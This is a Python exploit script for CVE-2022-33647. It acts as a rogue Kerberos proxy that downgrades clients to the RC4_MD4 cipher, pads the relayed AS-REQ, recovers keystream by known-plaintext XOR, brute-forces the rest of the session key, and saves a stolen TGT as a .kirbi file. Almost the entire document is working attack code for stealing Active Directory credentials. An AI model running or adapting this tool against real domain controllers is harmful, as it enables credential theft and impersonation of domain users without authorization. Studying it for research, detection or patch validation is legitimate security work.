# Exploit for CVE-2022-33647
# 
# This attack will work if the following conditions are met:
#  - DC is not patched
#  - DC allows RC4_MD4 kerberos cipher to be used. Etype: -128 
#  - You can coerce the target machine to connect to your machine on port 88
#
# Original project-zero issue: https://bugs.chromium.org/p/project-zero/issues/detail?id=2310
# Writeup: https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html
# 
# Found by: 
#  James Forshaw (@tiraniddo), Project Zero
#  
# This code by:
#  Tamas Jos (@skelsec)
#

import asyncio
import traceback
import datetime
import base64
from minikerberos.protocol.asn1_structs import KerberosMessage, \
	METHOD_DATA, ETYPE_INFO, ETYPE_INFO2, PA_DATA, KRB_ERROR,\
	PrincipalName, EncryptedData, HostAddress, AS_REQ, EncryptionKey,\
	TicketFlags, KrbCredInfo, EncKrbCredPart, KRB_CRED
from minikerberos.protocol.constants import PaDataType
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.target import KerberosTarget
from minikerberos.common.spn import KerberosSPN
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.protocol.encryption import Key, _enctype_table

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

ts_len_hdr_lookup = {
	26: bytes.fromhex('a1030201'),
	27: bytes.fromhex('a1040202'),
	28: bytes.fromhex('a1050203'),
	29: bytes.fromhex('a1060204'),
}

def format_kirbi(data, n = 100):
	kd = base64.b64encode(data).decode()
	return '    ' + '\r\n    '.join([kd[i:i+n] for i in range(0, len(kd), n)])


def tgt_to_kirbi(tgt, sessionkey, now):
	keyd = {
		'keytype': -128, 
		'keyvalue': sessionkey
	}

	ci = {}
	ci['key'] = EncryptionKey(keyd)
	ci['prealm'] = tgt['crealm']
	ci['pname'] = tgt['cname']
	ci['flags'] = TicketFlags(set(['enc-pa-rep', 'forwardable', 'renewable', 'initial', 'proxiable'])) #guessing...
	ci['authtime'] = now
	ci['starttime'] = now
	ci['endtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
	ci['renew-till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
	ci['srealm'] = tgt['crealm'] # guessing! modify this if not valid....
	ci['sname'] = PrincipalName({'name-type': 1, 'name-string': ['krbtgt', tgt['crealm']]})

	ti = {}
	ti['ticket-info'] = [KrbCredInfo(ci)]

	te = {}
	te['etype']  = 0
	te['cipher'] = EncKrbCredPart(ti).dump()

	t = {}
	t['pvno'] = 5
	t['msg-type'] = 22
	t['enc-part'] = EncryptedData(te)
	t['tickets'] = [tgt['ticket']]

	return KRB_CRED(t)

def calc_known_plaintext(cipher):
	# returns the known values for the initial structure which depends on the length
	# original data starts with 24 bytes of \x00 then the ASN1 struct
	# the first 24 bytes is where the cofounder and mac should be but in this case it's just zeroes
	data_length = len(cipher)
	if data_length <= 127:
		raise Exception('NO')
	first_len = data_length - 4
	second_len = first_len - 4
	if first_len < 127:
		fl = first_len.to_bytes(1, byteorder='big', signed=False)
	elif first_len < 256:
		fl = b'\x81' + first_len.to_bytes(1, byteorder='big', signed=False)
	else:
		fl = b'\x82' + first_len.to_bytes(2, byteorder='big', signed=False)

	if second_len < 127:
		sl = second_len.to_bytes(1, byteorder='big', signed=False)
	elif second_len < 256:
		sl = b'\x81' + second_len.to_bytes(1, byteorder='big', signed=False)
	else:
		sl = b'\x82' + second_len.to_bytes(2, byteorder='big', signed=False)
	return b'\x79' + fl + b'\x30'+ sl +b'\xA0\x1B\x30\x19\xA0\x03\x02\x01\x80\xA1\x12\x04\x10'

def get_padding_data():
	# for the attack to work, we need a TGT with a larger-than-normal AS-REP enc-data
	# we achieve this by adding a lot of hostaddresses in the AS-REQ, 
	# which will be reflected in the AS-REP
	hosts = []
	for x in range(50):
		hd = {
			'addr-type' : 1,
			'address' : b'\x00'*2 + x.to_bytes(2, byteorder='big', signed=False)
		}
		hosts.append(HostAddress(hd))
	return hosts

class KerberosProxy:
	def __init__(self, dc_ip, listen_ip, dc_port = 88, listen_port = 88):
		self.dc_ip = dc_ip
		self.dc_port = dc_port
		self.listen_ip = listen_ip
		self.listen_port = listen_port

	async def read_ticket(self, reader):
		try:
			ticketlenraw = await reader.readexactly(4)
			ticketlen = int.from_bytes(ticketlenraw, byteorder = 'big', signed = False)
			ticketdata = await reader.readexactly(ticketlen)
			ticket = KerberosMessage.load(ticketdata)
			ticketnative= ticket.native
			return ticketdata, ticket, ticketnative, None

		except Exception as e:
			return None, None, None, e
	
	async def send_ticket(self, writer, ticketdata):
		try:
			tlen = len(ticketdata).to_bytes(4, byteorder = 'big', signed = False)
			writer.write(tlen + ticketdata)
			await writer.drain()
			return True, None

		except Exception as e:
			return  None, e
	
	async def handle_client(self, reader, writer):
		dcwriter = None
		try:
			addr = writer.get_extra_info('peername')
			saddr = '%s:%s' % (addr[0], addr[1])
			print('[+] Client connected from %s' % (saddr))

			ticketdata, ticket, ticketnative, err = await self.read_ticket(reader)
			if err is not None:
				raise err
			if ticketnative['msg-type'] != 10:
				print('[-] Not expected ticket arrived from client. Msg type: %s' % ticketnative['msg-type'])
				return
			
			for padata in ticketnative['padata']:
				if padata['padata-type'] == 2: #and padata[]:
					ed = EncryptedData.load(padata['padata-value']).native
					if ed['etype'] == -128:
						enc_timestamp = ed['cipher'][24:]
						break
			#This is AS-REQ
			else:
				# not the expected encryption type, sending error message to client,
				# informing it that we only support etype -128
				print('[+] Downgrading Kerberos encryption to RC4_MD4')
				now = datetime.datetime.now(datetime.timezone.utc)
				realm = ticketnative['req-body']['realm']
				pad1 = PA_DATA({
					'padata-type' : PaDataType.ETYPE_INFO2.value,
					'padata-value': ETYPE_INFO2([{'etype' : -128}]).dump()
				})
				pad2 = PA_DATA({
					'padata-type' : 2,
					'padata-value': b'',
				})
				pad3 = PA_DATA({
					'padata-type' : 15,
					'padata-value': b'',
				})
				pad4 = PA_DATA({
					'padata-type' : 16,
					'padata-value': b'',
				})
				md = [pad1, pad2, pad3, pad4]
				
				err = {
					'pvno' : 5,
					'msg-type': 30,
					#'ctime': None
					#'cusec': None,
					'stime' : now.replace(microsecond=0),
					'susec' : now.microsecond,
					'error-code' : 25,
					#'crealm' : None,
					#'cname' : None,
					'realm' : realm,
					'sname' : PrincipalName({'name-type': 1, 'name-string': ['krbtgt', realm]}),# krbtgt name..,
					#'e-text' : None,
					'e-data': METHOD_DATA(md).dump()

				}
				ticketdata = KRB_ERROR(err).dump()

				_, err = await self.send_ticket(writer, ticketdata)
				if err is not None:
					raise err
				return
			
			print('[+] Connecting to DC at %s:%s' % (self.dc_ip, self.dc_port))
			dcreader, dcwriter = await asyncio.open_connection(self.dc_ip, self.dc_port)
			print('[+] Connected to DC!')
			print('[+] Modifying original AS-REQ...')
			ticketnative['req-body']['addresses'] = get_padding_data()
			modded_ticket = AS_REQ(ticketnative).dump()
			_, err = await self.send_ticket(dcwriter, modded_ticket)
			if err is not None:
				raise err
			print('[+] Submitting original AS-REQ to DC')
			rticketdata, rticket, rticketnative, err = await self.read_ticket(dcreader)
			if err is not None:
				raise err
			print('[+] Got AS-REP with the correct enctype!')
			cipher_data = rticketnative['enc-part']['cipher'][24:]
			known_plaintext = calc_known_plaintext(rticketnative['enc-part']['cipher'][24:])
			if len(known_plaintext) < 21:
				print('[-] AS-REP cipher data too short! Will not work..')
				return
			print('[i] ENC TIMESTAMP: %s' % enc_timestamp.hex())
			print('[i] AS-REP CIPHER: %s' % cipher_data.hex()[:0x40])
			
			
			ts_bytes = enc_timestamp[len(known_plaintext):]
			cipher_bytes = cipher_data[len(known_plaintext):]
			keystream = byte_xor(ts_bytes, ts_len_hdr_lookup[len(enc_timestamp)])
			dec_key = byte_xor(keystream, cipher_bytes)
			print('[i] ENC BYTESTREAM   : %s' % ts_bytes.hex())
			print('[i] CIP BYTESTREAM   : %s' % cipher_bytes.hex()[:0x40])
			print('[i] KNOWN PLAINTEXT  : %s' % known_plaintext.hex())
			print('[i] KEYSTREAM FROM TS: %s' % keystream.hex())
			print('[i] DEC KEY - 4 BYTES: %s' % dec_key.hex())
			print('[+] Guessing last bytes of the session key...')
			target = KerberosTarget(self.dc_ip)
			credential = KerberosCredential()
			credential.username = ticketnative['req-body']['cname']['name-string'][0]
			credential.domain = ticketnative['req-body']['realm']
			credential.password = 'A'
			client = AIOKerberosClient(credential, target)
			client.kerberos_TGT = rticketnative
			for i in range(256):
				i = i.to_bytes(1, byteorder='big', signed=False)
				keyguess = dec_key + i + b'\xAB'*11
				print('[i] GUESSING KEY: %s' % keyguess.hex())
				
				client.kerberos_TGT = rticketnative
				client.kerberos_cipher = _enctype_table[-128]
				client.kerberos_cipher_type = -128
				client.kerberos_session_key = Key(-128, keyguess)
				try:
					await client.get_TGS(KerberosSPN.from_upn('krbtgt@test.corp'))
				except Exception as e:
					continue
				else:
					now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
					print('[+] GUESSED CORRECTLY! SESSIONKEY: %s' % keyguess.hex())
					kirbi = tgt_to_kirbi(rticketnative, keyguess, now).dump()
					print('[+] KIRBI DATA:')
					print(format_kirbi(kirbi))
					filename = '%s.kirbi' % (now.strftime("%Y%m%d_%H%M%S"))
					print('[+] Writing .kirbi file to: %s' % filename)
					with open(filename, 'wb') as f:
						f.write(kirbi)
					return

		except Exception as e:
			traceback.print_exc()
			#return None, e
		finally:
			if dcwriter is not None:
				dcwriter.close()
			writer.close()

	
	async def run(self):
		try:
			server = await asyncio.start_server(self.handle_client, host=self.listen_ip, port=self.listen_port)
			async with server:
				await server.serve_forever()

			return True, None
		except Exception as e:
			traceback.print_exc()
			return None, e

async def amain():
	import argparse
	parser = argparse.ArgumentParser(description='Kerberos proxy to exploit CVE-2022-33647')
	parser.add_argument('dcip', help='IP/hostname of the domain controller')
	parser.add_argument('--dc-port', default=88, type=int, help='Port of the Kerberos service on the DC.')
	parser.add_argument('--listen-ip', default='127.0.0.1', help='IP/hostname to listen for incoming kerberos traffic')
	parser.add_argument('--listen-port', default=88, type=int, help='IP/hostname to listen for incoming kerberos traffic')
	args = parser.parse_args()

	kp = KerberosProxy(args.dcip, args.listen_ip, args.dc_port, args.listen_port)
	await kp.run()

def main():
	asyncio.run(amain())

if __name__ == '__main__':
	main()